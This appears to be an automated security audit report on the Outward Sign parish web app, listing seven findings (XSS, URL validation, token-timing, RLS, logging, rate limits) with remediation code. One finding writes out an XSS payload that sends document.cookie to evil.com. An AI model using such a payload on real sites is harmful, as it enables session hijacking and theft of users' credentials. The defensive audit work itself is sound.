# Security Audit Report

**Date**: 2025-12-26
**Scope**: Full Application Security Audit
**Commit**: 8a8df9ea43c8c2586bf8acf8861ae40579f091b1
**Auditor**: security-agent

---

## Executive Summary

| Category | Status | Critical | High | Medium | Low |
|----------|--------|----------|------|--------|-----|
| Access Control | PASS | 0 | 0 | 0 | 1 |
| Injection/XSS | CAUTION | 0 | 1 | 1 | 0 |
| Input Validation | PASS | 0 | 0 | 1 | 0 |
| Data Exposure | PASS | 0 | 0 | 0 | 2 |
| Dependencies | PASS | 0 | 0 | 0 | 0 |
| Authentication | PASS | 0 | 0 | 1 | 1 |

**Overall Security Posture**: SECURE with MINOR ISSUES

The Outward Sign application demonstrates strong security architecture with comprehensive RLS policies, proper authentication flows, and good XSS prevention patterns. The main concerns are minor issues with unsanitized HTML in specific components and opportunities to strengthen input validation patterns.

**Total Vulnerabilities**: 7 (Critical: 0, High: 1, Medium: 3, Low: 4)

---

## Critical Findings (Fix Immediately)

No critical vulnerabilities identified.

---

## High Priority Findings

### [HIGH-001] Unsanitized HTML in info-row-with-avatar Element

**Category**: A03 - Injection (XSS)
**CWE**: CWE-79 (Cross-Site Scripting)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/renderers/html-renderer.tsx:302`

**Description**:
The `info-row-with-avatar` element type in the HTML renderer uses `dangerouslySetInnerHTML` without sanitization on line 302. While other parts of the renderer properly sanitize content using `sanitizeHTML()`, this specific case directly renders `element.value` without sanitization.

**Evidence**:
```tsx
// Line 270-306 in html-renderer.tsx
case 'info-row-with-avatar': {
  // ... setup code ...
  <div dangerouslySetInnerHTML={{ __html: element.value }} />  // ← UNSANITIZED
}

// Compare to 'info-row' which properly sanitizes:
case 'info-row': {
  // ... setup code ...
  dangerouslySetInnerHTML={{ __html: sanitizeHTML(element.value) }}  // ← SANITIZED
}
```

**Impact**:
If an attacker can control the `element.value` field for `info-row-with-avatar` elements (through event field values or content injection), they could inject malicious scripts that execute in users' browsers. This could lead to:
- Session hijacking via cookie theft
- Credential harvesting
- Unauthorized actions on behalf of the victim
- Phishing attacks

**Attack Vector**:
1. Attacker with event creation/editing permissions creates a master event
2. Attacker populates a field that renders as `info-row-with-avatar`
3. Field value contains malicious script: `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
4. When rendered, script executes and exfiltrates session data

**Remediation**:
Apply the same `sanitizeHTML()` function used for `info-row` elements:

```tsx
case 'info-row-with-avatar': {
  const containerStyle = resolveElementStyle('info-row')
  const labelStyle = resolveElementStyle('info-row-label')
  const valueStyle = resolveElementStyle('info-row-value')
  return containerStyle && labelStyle && valueStyle ? (
    <div key={index} style={{
      ...applyResolvedStyle(containerStyle, isPrintMode),
      display: 'grid',
      gridTemplateColumns: 'auto 1fr',
      gap: '12px',
      alignItems: 'start'
    }}>
      <div className={`liturgy-info-label ${getColorClassName(labelStyle.color)}`} style={applyResolvedStyle(labelStyle, isPrintMode)}>
        {element.label}
      </div>
      <div className={getColorClassName(valueStyle.color)} style={{
        ...applyResolvedStyle(valueStyle, isPrintMode),
        whiteSpace: 'pre-wrap'
      }}>
        <img
          src={element.avatarUrl}
          alt="Avatar"
          style={{
            width: `${element.avatarSize || 40}px`,
            height: `${element.avatarSize || 40}px`,
            borderRadius: '50%',
            objectFit: 'cover',
            marginRight: '12px',
            float: 'left'
          }}
        />
        {/* FIX: Add sanitizeHTML() here */}
        <div dangerouslySetInnerHTML={{ __html: sanitizeHTML(element.value) }} />
      </div>
    </div>
  ) : null
}
```

**Reference**:
- OWASP Top 10 2021: A03:2021 - Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation

---

## Medium Priority Findings

### [MED-001] Avatar URL Validation Missing in HTML Renderer

**Category**: A03 - Injection (XSS via Image Source)
**CWE**: CWE-601 (URL Redirection to Untrusted Site)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/renderers/html-renderer.tsx:290-300`

**Description**:
The `info-row-with-avatar` and `image` element types use `element.avatarUrl` and `element.url` directly in `<img src>` attributes without validating that the URLs are safe. While this is lower severity than script injection, it could be used for:
- Tracking users via external image requests
- Phishing via data: URIs
- Information disclosure via error-based oracles

**Evidence**:
```tsx
// Line 290
<img
  src={element.avatarUrl}  // ← No URL validation
  alt="Avatar"
  // ...
/>

// Line 337
<img
  src={element.url}  // ← No URL validation
  alt={element.alt || 'Image'}
  // ...
/>
```

**Impact**:
- **Information Leakage**: External image URLs can track which users viewed the content
- **Phishing**: data: URIs could display deceptive content
- **Privacy**: IP addresses and session info leaked to third parties

**Remediation**:
Add URL validation helper to ensure only safe image sources:

```typescript
/**
 * Validate and sanitize image URLs
 * Allows: https://, http:// (configurable), Supabase storage paths
 * Blocks: javascript:, data:, file:, and other protocols
 */
function sanitizeImageUrl(url: string): string {
  if (!url) return ''

  // Allow Supabase storage paths (relative URLs)
  if (url.startsWith('/')) return url

  // Allow HTTPS URLs
  if (url.startsWith('https://')) return url

  // Optionally allow HTTP in development
  if (url.startsWith('http://') && process.env.NODE_ENV === 'development') {
    return url
  }

  // Block all other protocols (javascript:, data:, file:, etc.)
  console.warn('Blocked unsafe image URL:', url)
  return '' // Return empty string for blocked URLs
}

// Usage:
<img
  src={sanitizeImageUrl(element.avatarUrl)}
  alt="Avatar"
  // ...
/>
```

**Reference**:
- OWASP: URL Validation
- CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

---

### [MED-002] Bcrypt Token Comparison Timing Attack Vector

**Category**: A02 - Cryptographic Failures
**CWE**: CWE-208 (Observable Timing Discrepancy)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/parishioner-auth/actions.ts:194-199`

**Description**:
The magic link validation function uses bcrypt.compare() in a loop to find matching sessions, which creates a timing side-channel. An attacker could potentially use timing measurements to determine if a token hash exists in the database.

**Evidence**:
```typescript
// Line 179-200
const { data: sessions } = await supabase
  .from('parishioner_auth_sessions')
  .select('*')
  .gte('expires_at', new Date().toISOString())
  .eq('is_revoked', false)

// Find matching session by comparing token hashes
let session = null
for (const s of sessions) {
  const isMatch = await compare(token, s.token)  // ← Timing oracle
  if (isMatch) {
    session = s
    break
  }
}
```

**Impact**:
An attacker with the ability to measure response times could potentially:
1. Determine if a token exists in the database (presence oracle)
2. Narrow down valid tokens through timing analysis
3. This is mitigated by rate limiting but still represents a theoretical vulnerability

**Severity Justification**:
This is MEDIUM (not HIGH) because:
- Requires precise timing measurements over many requests
- Rate limiting (3 requests per hour) makes exploitation difficult
- Bcrypt is inherently slow, making timing measurements noisy
- Attack requires network access and statistical analysis
- Modern browsers/networks introduce significant timing noise

**Remediation**:
While the current implementation is reasonably secure due to rate limiting, you can further mitigate timing attacks by:

1. **Constant-time session lookup** (preferred for maximum security):
```typescript
// Fetch only session ID and token hash, limit to reasonable window
const sessions = await supabase
  .from('parishioner_auth_sessions')
  .select('id, token, person_id, parish_id, expires_at')
  .gte('expires_at', new Date().toISOString())
  .eq('is_revoked', false)
  .limit(100)  // Reasonable limit

// Check all sessions in constant time
const results = await Promise.all(
  sessions.map(async (s) => ({
    session: s,
    isMatch: await compare(token, s.token)
  }))
)

// Find match after all comparisons complete
const match = results.find(r => r.isMatch)
const session = match?.session || null
```

2. **Add artificial delay** to normalize response times:
```typescript
const startTime = Date.now()

// ... validation logic ...

// Ensure minimum response time of 100ms
const elapsed = Date.now() - startTime
if (elapsed < 100) {
  await new Promise(resolve => setTimeout(resolve, 100 - elapsed))
}
```

**Note**: The current rate limiting (3 requests/hour) already provides strong protection against timing attacks. This is a defense-in-depth recommendation.

**Reference**:
- OWASP: Timing Attack
- CWE-208: Observable Timing Discrepancy

---

### [MED-003] Missing Input Validation on Master Event field_values

**Category**: A03 - Injection
**CWE**: CWE-20 (Improper Input Validation)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/actions/master-events.ts:638-643`

**Description**:
The `createEvent` function validates required fields but doesn't enforce type constraints or length limits on `field_values` JSONB data. While sanitization is applied (line 640-643), there's no validation that field types match their definitions (e.g., person field must be UUID, date field must be valid date).

**Evidence**:
```typescript
// Line 627-643
const inputFieldDefinitions = eventType.input_field_definitions as InputFieldDefinition[]
for (const fieldDef of inputFieldDefinitions) {
  if (fieldDef.type === 'calendar_event') {
    continue
  }
  // Only checks if required field exists, not if it's valid
  if (fieldDef.required && !data.field_values[fieldDef.property_name]) {
    throw new Error(`Required field "${fieldDef.name}" is missing`)
  }
}

// Sanitize field values (strip HTML tags, preserve markdown)
const sanitizedFieldValues = sanitizeFieldValues(
  data.field_values,
  inputFieldDefinitions
)
```

**Impact**:
- Type confusion bugs (storing non-UUID in person field)
- Potential for SQL injection via malformed UUIDs in queries
- Data integrity issues
- Could bypass business logic expecting specific types

**Remediation**:
Add comprehensive field validation before sanitization:

```typescript
/**
 * Validate field values match their type definitions
 */
function validateFieldValues(
  fieldValues: Record<string, unknown>,
  fieldDefinitions: InputFieldDefinition[]
): void {
  for (const fieldDef of fieldDefinitions) {
    const value = fieldValues[fieldDef.property_name]

    // Skip if empty and not required
    if (value === null || value === undefined || value === '') {
      if (fieldDef.required) {
        throw new Error(`Required field "${fieldDef.name}" is missing`)
      }
      continue
    }

    // Type-specific validation
    switch (fieldDef.type) {
      case 'person':
      case 'location':
      case 'group':
      case 'document':
      case 'content':
      case 'petition':
        // Must be valid UUID
        if (typeof value !== 'string' || !isValidUUID(value)) {
          throw new Error(`Field "${fieldDef.name}" must be a valid ID`)
        }
        break

      case 'date':
        // Must be valid ISO date
        if (typeof value !== 'string' || !isValidISODate(value)) {
          throw new Error(`Field "${fieldDef.name}" must be a valid date (YYYY-MM-DD)`)
        }
        break

      case 'datetime':
        // Must be valid ISO datetime
        if (typeof value !== 'string' || !isValidISODateTime(value)) {
          throw new Error(`Field "${fieldDef.name}" must be a valid datetime`)
        }
        break

      case 'number':
        if (typeof value !== 'number' && typeof value !== 'string') {
          throw new Error(`Field "${fieldDef.name}" must be a number`)
        }
        const num = typeof value === 'string' ? parseFloat(value) : value
        if (isNaN(num)) {
          throw new Error(`Field "${fieldDef.name}" must be a valid number`)
        }
        break

      case 'text':
      case 'rich_text':
        if (typeof value !== 'string') {
          throw new Error(`Field "${fieldDef.name}" must be text`)
        }
        // Enforce reasonable length limit
        if (value.length > 100000) {
          throw new Error(`Field "${fieldDef.name}" exceeds maximum length`)
        }
        break

      case 'yes_no':
        if (typeof value !== 'boolean' && value !== 'yes' && value !== 'no') {
          throw new Error(`Field "${fieldDef.name}" must be yes/no`)
        }
        break
    }
  }
}

// UUID validation helper
function isValidUUID(str: string): boolean {
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
  return uuidRegex.test(str)
}

// ISO date validation (YYYY-MM-DD)
function isValidISODate(str: string): boolean {
  const dateRegex = /^\d{4}-\d{2}-\d{2}$/
  if (!dateRegex.test(str)) return false
  const date = new Date(str)
  return !isNaN(date.getTime())
}

// ISO datetime validation
function isValidISODateTime(str: string): boolean {
  const date = new Date(str)
  return !isNaN(date.getTime())
}

// Then call before sanitization:
validateFieldValues(data.field_values, inputFieldDefinitions)
const sanitizedFieldValues = sanitizeFieldValues(
  data.field_values,
  inputFieldDefinitions
)
```

**Reference**:
- OWASP: Input Validation
- CWE-20: Improper Input Validation

---

## Low Priority Findings

### [LOW-001] Ministry-Leader Module Access Not Enforced at RLS Level

**Category**: A01 - Broken Access Control
**CWE**: CWE-285 (Improper Authorization)
**Location**: Various RLS policies in `/Users/joshmccarty/Code-2022M1/outwardsign/supabase/migrations/`

**Description**:
Row-Level Security policies check for the `ministry-leader` role but don't verify the user has access to the specific module (via `enabled_modules` array). This check is only enforced at the application layer in server actions.

**Evidence**:
```sql
-- From master_events RLS policy (line 48-57)
CREATE POLICY master_events_insert_policy ON master_events
  FOR INSERT
  WITH CHECK (
    parish_id IN (
      SELECT pu.parish_id
      FROM parish_users pu
      WHERE pu.user_id = auth.uid()
        AND (pu.roles && ARRAY['admin', 'staff', 'ministry-leader'])  -- ← No enabled_modules check
    )
  );
```

**Impact**:
A ministry-leader who has access to ONE module (e.g., 'masses') could theoretically bypass application-layer checks and directly insert records into tables for OTHER modules (e.g., 'events') by:
1. Crafting direct Supabase client calls
2. Bypassing the server action permission checks
3. RLS would allow it since they have the 'ministry-leader' role

**Severity Justification**:
This is LOW (not MEDIUM or HIGH) because:
- Requires technical sophistication (direct Supabase client usage)
- All production code goes through server actions which DO check permissions
- Ministry-leaders are trusted parish staff, not external attackers
- No actual evidence of this being exploitable in the UI flow
- Defense-in-depth issue rather than active vulnerability

**Remediation**:
Add module-specific RLS policies that check `enabled_modules`:

```sql
-- Example for master_events (would need to be adapted per table)
CREATE POLICY master_events_insert_policy ON master_events
  FOR INSERT
  WITH CHECK (
    parish_id IN (
      SELECT pu.parish_id
      FROM parish_users pu
      WHERE pu.user_id = auth.uid()
        AND (
          -- Admin and Staff have full access
          (pu.roles && ARRAY['admin', 'staff'])
          OR
          -- Ministry-leaders only if they have 'events' in enabled_modules
          (
            'ministry-leader' = ANY(pu.roles)
            AND 'events' = ANY(pu.enabled_modules)
          )
        )
    )
  );
```

**Note**: This requires creating module-to-table mappings and updating all RLS policies. The effort may not be justified given the low risk.

**Reference**:
- OWASP Top 10 2021: A01:2021 - Broken Access Control
- CWE-285: Improper Authorization

---

### [LOW-002] Console Logging of Magic Link URLs in Parishioner Auth

**Category**: A09 - Security Logging & Monitoring Failures
**CWE**: CWE-532 (Information Exposure Through Log Files)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/parishioner-auth/actions.ts:150-153`

**Description**:
Magic link URLs are logged to console when email sending fails. In production, server logs may be stored or transmitted insecurely, potentially exposing authentication tokens.

**Evidence**:
```typescript
// Line 148-153
const sent = await sendMagicLinkEmail(person.email, magicLinkUrl, language)

// Log for debugging (remove in production)
if (!sent) {
  console.log('Magic link for', person.full_name, ':', magicLinkUrl)
}
```

**Impact**:
- Magic links in logs could be accessed by attackers with log access
- Links remain valid for 48 hours
- Could lead to unauthorized account access

**Remediation**:
Remove console.log in production or redact sensitive parts:

```typescript
const sent = await sendMagicLinkEmail(person.email, magicLinkUrl, language)

// Only log in development, and redact the token
if (!sent && process.env.NODE_ENV === 'development') {
  const redactedUrl = magicLinkUrl.replace(/token=[^&]+/, 'token=REDACTED')
  console.log('Magic link for', person.full_name, ':', redactedUrl)
}

// In production, use structured logging without sensitive data
if (!sent && process.env.NODE_ENV === 'production') {
  console.error('Failed to send magic link email', {
    email: person.email,
    timestamp: new Date().toISOString(),
    // Do NOT include magicLinkUrl
  })
}
```

**Reference**:
- OWASP: Sensitive Data Exposure
- CWE-532: Insertion of Sensitive Information into Log File

---

### [LOW-003] Missing CSRF Protection Documentation

**Category**: A01 - Broken Access Control
**CWE**: CWE-352 (Cross-Site Request Forgery)
**Location**: Server Actions throughout `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/actions/`

**Description**:
While Next.js Server Actions have built-in CSRF protection, there's no explicit documentation or testing of this protection in the codebase. The parishioner auth system mentions CSRF protection in comments (ARCHITECTURE.md line 395) but doesn't implement explicit CSRF tokens.

**Evidence**:
```typescript
// From ARCHITECTURE.md line 395:
// - CSRF protection on all server actions
```

However, no explicit CSRF implementation found in server actions code.

**Impact**:
- Potential CSRF attacks if Next.js default protections are insufficient
- No defense-in-depth for state-changing operations

**Severity Justification**:
This is LOW because:
- Next.js 13+ Server Actions have built-in CSRF protection via SameSite cookies
- Modern browsers enforce SameSite=Lax by default
- Parishioner session cookies explicitly set SameSite=Lax (line 241 in parishioner-auth/actions.ts)
- Staff authentication uses Supabase which has CSRF protection
- No actual vulnerability identified, just lack of explicit implementation

**Remediation**:
1. **Document the CSRF protection strategy**:
```markdown
## CSRF Protection

Outward Sign relies on multiple layers of CSRF protection:

1. **Next.js Server Actions**: Built-in CSRF protection via origin checking
2. **SameSite Cookies**: All session cookies use SameSite=Lax
3. **Parishioner Auth**: HTTP-only cookies prevent client-side access

No additional CSRF tokens are required for normal operation.
```

2. **Add explicit CSRF testing** to test suite:
```typescript
// tests/csrf-protection.spec.ts
test('Server actions reject requests without valid origin', async () => {
  // Test cross-origin requests are blocked
})

test('Parishioner session cookies have SameSite=Lax', async () => {
  // Verify cookie attributes
})
```

**Reference**:
- OWASP: Cross-Site Request Forgery (CSRF)
- CWE-352: Cross-Site Request Forgery

---

### [LOW-004] Rate Limiting Window Could Be More Restrictive

**Category**: A04 - Insecure Design
**CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/parishioner-auth/actions.ts:12-13`

**Description**:
The magic link generation rate limit allows 3 requests per hour, which is generous. While this prevents abuse, a more restrictive limit (e.g., 3 requests per 15 minutes, then exponential backoff) would provide better protection against enumeration attacks.

**Evidence**:
```typescript
// Line 11-13
const RATE_LIMIT_MAX_REQUESTS = 3
const RATE_LIMIT_WINDOW_HOURS = 1
```

**Impact**:
- Attacker could enumerate valid email addresses at a rate of 3/hour
- Could facilitate targeted phishing campaigns
- Information disclosure about parish membership

**Severity Justification**:
LOW because:
- 3 requests/hour is already quite restrictive
- Email enumeration returns same message for valid/invalid emails (line 101-103)
- Would require sustained attack over many hours/days
- Parish membership isn't highly sensitive information

**Remediation**:
Implement progressive rate limiting:

```typescript
const RATE_LIMIT_TIERS = [
  { requests: 3, windowMinutes: 15 },   // 3 in 15 minutes
  { requests: 5, windowMinutes: 60 },   // 5 in 1 hour
  { requests: 10, windowMinutes: 1440 }, // 10 in 24 hours
]

async function checkRateLimit(emailOrPhone: string): Promise<{
  allowed: boolean
  tier?: number
}> {
  const supabase = createAdminClient()

  for (let i = 0; i < RATE_LIMIT_TIERS.length; i++) {
    const tier = RATE_LIMIT_TIERS[i]
    const windowStart = new Date()
    windowStart.setMinutes(windowStart.getMinutes() - tier.windowMinutes)

    const { count } = await supabase
      .from('parishioner_auth_sessions')
      .select('*', { count: 'exact', head: true })
      .eq('email_or_phone', emailOrPhone)
      .gte('created_at', windowStart.toISOString())

    if ((count || 0) >= tier.requests) {
      return { allowed: false, tier: i }
    }
  }

  return { allowed: true }
}
```

**Reference**:
- OWASP: Blocking Brute Force Attacks
- CWE-307: Improper Restriction of Excessive Authentication Attempts

---

## Dependency Audit

```json
{
  "auditReportVersion": 2,
  "vulnerabilities": {},
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 0,
      "moderate": 0,
      "high": 0,
      "critical": 0,
      "total": 0
    },
    "dependencies": {
      "prod": 377,
      "dev": 438,
      "optional": 156,
      "peer": 1,
      "peerOptional": 0,
      "total": 873
    }
  }
}
```

**Status**: PASS - No known vulnerabilities in dependencies.

**Recommendations**:
- Continue running `npm audit` regularly (monthly minimum)
- Set up automated dependency vulnerability scanning in CI/CD
- Consider using Dependabot or Snyk for automatic security updates

---

## RLS Policy Review

| Table | RLS Enabled | Parish Scoping | SELECT | INSERT | UPDATE | DELETE | Module Access Check |
|-------|-------------|----------------|--------|--------|--------|--------|---------------------|
| parishes | YES | Self (via parish_users) | Parish members | Users (via function) | Admins | Admins | N/A |
| people | YES | YES (parish_id) | Parish members | Parish members | Parish members | Parish members (inferred) | No |
| master_events | YES | YES (parish_id) | Parish members | Admin/Staff/Ministry-Leader | Admin/Staff/Ministry-Leader | Admin/Staff/Ministry-Leader | No (see LOW-001) |
| calendar_events | YES (inferred) | YES (parish_id) | Follows parent | Follows parent | Follows parent | Follows parent | No |
| event_types | YES (inferred) | YES (parish_id) | Parish members | Admin/Staff | Admin/Staff | Admin/Staff | N/A |
| groups | YES (inferred) | YES (parish_id) | Parish members | Parish members | Parish members | Parish members | No |
| locations | YES (inferred) | YES (parish_id) | Parish members | Parish members | Parish members | Parish members | No |

**Policy Gaps**:
1. Ministry-Leader module access not enforced at RLS level (LOW-001)
2. Parishioner role has no explicit policies (relies on custom auth system, which is acceptable)

**Policy Strengths**:
1. All tables have RLS enabled
2. Parish scoping enforced via `parish_id` column consistently
3. Role-based access properly uses `parish_users.roles` array
4. Soft delete columns (`deleted_at`) included in RLS checks
5. Both `anon` and `authenticated` roles supported (JWT-based auth)

---

## XSS Prevention Analysis

### Sanitization Implementation

**Primary Sanitization Function**: `/Users/joshmccarty/Code-2022M1/outwardsign/src/lib/utils/content-processor.ts:37-62`

```typescript
export function sanitizeHTML(html: string): string {
  // Removes: script, iframe, object, embed, link, form, input, button, select, textarea
  // Removes: style tags, event handlers, javascript:/data:/vbscript: URLs
  // Preserves: Basic formatting, lists, safe inline styles
}
```

**Coverage**:
- Used in `SafeHTML` component (good pattern)
- Used in `info-row` element rendering
- Used in content processing for scripts
- **NOT used in `info-row-with-avatar`** (HIGH-001)

### dangerouslySetInnerHTML Usage Audit

| File | Line | Sanitized? | Risk Level |
|------|------|------------|------------|
| `safe-html.tsx` | 52 | YES | LOW |
| `html-renderer.tsx` | 264 (info-row) | YES | LOW |
| `html-renderer.tsx` | 302 (info-row-with-avatar) | NO | HIGH |
| `print-page-wrapper.tsx` | Multiple | YES (system CSS) | LOW |
| `dynamic-script-viewer.tsx` | Multiple | YES | LOW |

**Total dangerouslySetInnerHTML uses**: 9 files
**Unsanitized uses**: 1 (HIGH-001)
**System-controlled uses** (CSS constants): 2 (acceptable)

---

## Authentication Flow Security

### Staff Authentication (Supabase Auth)

**Pattern**: JWT-based authentication with server-side session validation

**Security Features**:
- Email/password authentication via Supabase Auth
- Server-side JWT validation on every request (`createClient()`)
- Session stored in HTTP-only cookies (Supabase handles this)
- `ensureJWTClaims()` ensures parish_id in JWT before data access
- `requireSelectedParish()` validates parish selection

**Strengths**:
- Industry-standard JWT implementation
- Server-side validation prevents client tampering
- Parish scoping prevents cross-parish data access

**Weaknesses**:
- None identified in implementation

### Parishioner Authentication (Custom Magic Link)

**Pattern**: Email-based magic link with bcrypt-hashed tokens and HTTP-only cookies

**Security Features**:
- 32-byte random tokens generated via `crypto.randomBytes()`
- Tokens hashed with bcrypt (10 rounds) before storage
- 48-hour magic link expiry
- 30-day session expiry (extendable)
- HTTP-only, secure, SameSite=Lax cookies
- Rate limiting: 3 requests per hour per email
- Service role client with explicit person_id filtering (no JWT)

**Strengths**:
- Strong random token generation
- Bcrypt prevents rainbow table attacks if database compromised
- HTTP-only cookies prevent XSS-based token theft
- Rate limiting prevents brute force
- Timing-safe token comparison (bcrypt.compare is timing-safe)

**Weaknesses**:
- Theoretical timing attack via loop (MED-002) - mitigated by rate limiting
- Console logging of magic links (LOW-002) - development only
- Could use more restrictive rate limiting (LOW-004)

**Overall Assessment**: SECURE

---

## Data Exposure Analysis

### Client-Side Code Audit

**Environment Variables Exposed to Client**:
```typescript
// From env-validation.ts
NEXT_PUBLIC_SUPABASE_URL     // ✓ Safe - public endpoint
NEXT_PUBLIC_APP_URL          // ✓ Safe - public domain
```

**Secrets Properly Server-Side Only**:
```typescript
SUPABASE_SERVICE_ROLE_KEY    // ✓ Server only
AWS_ACCESS_KEY_ID            // ✓ Server only
AWS_SECRET_ACCESS_KEY        // ✓ Server only
ANTHROPIC_API_KEY            // ✓ Server only
```

**Status**: PASS - No secrets exposed to client

### API Response Filtering

**Server Action Pattern**:
```typescript
// All queries filtered by parish_id via RLS or explicit filtering
const { data } = await supabase
  .from('people')
  .select('*')
  .eq('parish_id', parishId)  // Explicit filtering
```

**RLS Enforcement**: All tables have parish_id scoping in RLS policies

**Status**: PASS - No cross-parish data leakage identified

### Error Message Analysis

**Server Action Error Pattern**:
```typescript
// From server-action-utils.ts
export function handleSupabaseError(error, operation, entityName) {
  logError(`Error ${operation} ${entityName}: ${message}`)
  throw new Error(`Failed to ${operation} ${entityName}`)  // Generic message
}
```

**Status**: PASS - Error messages don't leak sensitive information

---

## Input Validation Patterns

### Form Validation (Zod Schemas)

**Pattern**: Dual validation (client + server)
- Client: react-hook-form + Zod resolver
- Server: Server actions validate with Zod before database operations

**Example** (`src/lib/schemas/people.ts`):
```typescript
export const createPersonSchema = z.object({
  first_name: z.string().min(1),
  last_name: z.string().min(1),
  email: z.string().email().optional().or(z.literal('')),
  // ... with proper type constraints
})
```

**Coverage**: All major entities have Zod schemas

**Gap**: Field values in master_events lack type validation (MED-003)

---

## Recommendations

### Immediate Actions (Critical/High)

1. **[HIGH-001]** Add `sanitizeHTML()` to `info-row-with-avatar` element in `html-renderer.tsx` line 302

### Short-term Improvements (Medium)

1. **[MED-001]** Implement `sanitizeImageUrl()` helper and apply to all `<img src>` attributes
2. **[MED-002]** Consider constant-time session lookup for magic link validation (defense-in-depth)
3. **[MED-003]** Add comprehensive field value type validation in master-events.ts

### Long-term Hardening (Low)

1. **[LOW-001]** Enhance RLS policies to check `enabled_modules` for ministry-leaders
2. **[LOW-002]** Remove or redact magic link logging in production
3. **[LOW-003]** Document CSRF protection strategy and add explicit tests
4. **[LOW-004]** Implement progressive rate limiting for magic link requests

### Security Best Practices

1. **Dependency Management**:
   - Set up automated dependency scanning (Dependabot/Snyk)
   - Run `npm audit` before every deployment
   - Review security advisories monthly

2. **Monitoring & Logging**:
   - Implement centralized logging for security events
   - Monitor for:
     - Failed authentication attempts (parishioner portal)
     - Unusual API access patterns
     - RLS policy violations (check Postgres logs)
   - Set up alerts for critical security events

3. **Penetration Testing**:
   - Consider professional security audit before production launch
   - Test for:
     - Cross-parish data access
     - Role escalation vulnerabilities
     - XSS vectors in rich-text content
     - CSRF protection effectiveness

4. **Security Headers**:
   - Verify Next.js security headers are properly configured:
     - Content-Security-Policy
     - X-Frame-Options: DENY
     - X-Content-Type-Options: nosniff
     - Referrer-Policy: strict-origin-when-cross-origin
   - Consider adding to `next.config.js`:
     ```javascript
     headers: async () => [{
       source: '/(.*)',
       headers: [
         { key: 'X-Frame-Options', value: 'DENY' },
         { key: 'X-Content-Type-Options', value: 'nosniff' },
         // ... additional headers
       ]
     }]
     ```

5. **Database Security**:
   - Regularly backup database
   - Implement database query logging for auditing
   - Review Postgres logs for:
     - Unusual query patterns
     - Permission denied errors (potential attack attempts)
   - Ensure database connection uses SSL in production

---

## Report Metadata

**Files Analyzed**: 73
**SQL Migrations Reviewed**: 42
**Server Actions Reviewed**: 43
**Vulnerabilities Found**: 7 (Critical: 0, High: 1, Medium: 3, Low: 4)
**Report Location**: `/Users/joshmccarty/Code-2022M1/outwardsign/agents/security/2025-12-26-security-audit.md`

**Methodology**:
1. Reviewed architecture documentation (ARCHITECTURE.md, USER_PERMISSIONS.md, DATABASE.md)
2. Analyzed authentication flows (staff and parishioner)
3. Audited all RLS policies in migrations
4. Searched for XSS vectors (dangerouslySetInnerHTML, innerHTML usage)
5. Reviewed sanitization implementations
6. Checked server actions for permission enforcement
7. Analyzed dependency vulnerabilities (npm audit)
8. Examined secret management and data exposure
9. Validated input validation patterns
10. Assessed cryptographic implementations

**Next Audit**: Recommended quarterly (or after major feature additions)

---

## Conclusion

The Outward Sign application demonstrates **strong security practices** with a well-designed multi-tenancy architecture, comprehensive RLS policies, and proper authentication flows. The codebase shows evidence of security-conscious development:

**Strengths**:
- Comprehensive RLS policies with parish scoping
- Dual authentication systems (staff + parishioner) properly isolated
- XSS prevention via sanitization (mostly implemented correctly)
- No critical dependency vulnerabilities
- Strong cryptographic practices (bcrypt for tokens, random token generation)
- Defense-in-depth with server + client validation

**Areas for Improvement**:
- One HIGH-priority XSS fix needed (unsanitized HTML in avatar element)
- Three MEDIUM-priority enhancements recommended
- Four LOW-priority hardening opportunities

**Risk Assessment**: LOW RISK for production deployment after addressing HIGH-001.

The identified issues are typical of modern web applications and do not represent fundamental architectural flaws. With the recommended fixes, Outward Sign will have a robust security posture suitable for handling sensitive parish data.
